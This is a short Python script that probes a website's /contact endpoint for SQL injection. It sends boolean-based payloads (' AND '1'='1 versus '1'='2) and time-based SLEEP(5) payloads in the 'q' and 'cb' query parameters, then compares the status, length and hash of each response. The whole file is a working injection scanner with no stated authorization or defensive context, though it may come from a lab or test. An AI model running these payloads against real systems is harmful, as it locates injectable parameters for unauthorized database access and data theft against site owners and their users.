import w13_req as W, time, sys, hashlib, json

def probe(path, n=2):
    outs = []
    for _ in range(n):
        r = W.fetch(path)
        if r is None or r.status_code not in (200, 405):
            outs.append(("ERR", r.status_code if r is not None else 0, 0))
            time.sleep(2); continue
        outs.append((r.status_code, len(r.content), hashlib.md5(r.content).hexdigest()[:8]))
        time.sleep(2)
    return outs

def show(label, path):
    o = probe(path)
    codes = [x[0] for x in o]
    lens = [x[1] for x in o]
    tag = "STABLE" if len(set(o))==1 else "VARIABLE"
    print(f"{label:34} {o}  {tag}")

if __name__ == "__main__":
    base = "/contact?cb=1&q=test"
    show("BASELINE", base)
    show("q single quote", "/contact?cb=1&q=test'")
    show("q boolean true", "/contact?cb=1&q=test' AND '1'='1")
    show("q boolean false", "/contact?cb=1&q=test' AND '1'='2")
    show("q sleep", "/contact?cb=1&q=test' AND SLEEP(5)-- -")
    show("cb baseline", "/contact?cb=1&q=test")
    show("cb boolean true", "/contact?cb=1%20AND%201=1&q=test")
    show("cb boolean false", "/contact?cb=1%20AND%201=2&q=test")
    show("cb sleep", "/contact?cb=1%20AND%20SLEEP(5)--%20&q=test")
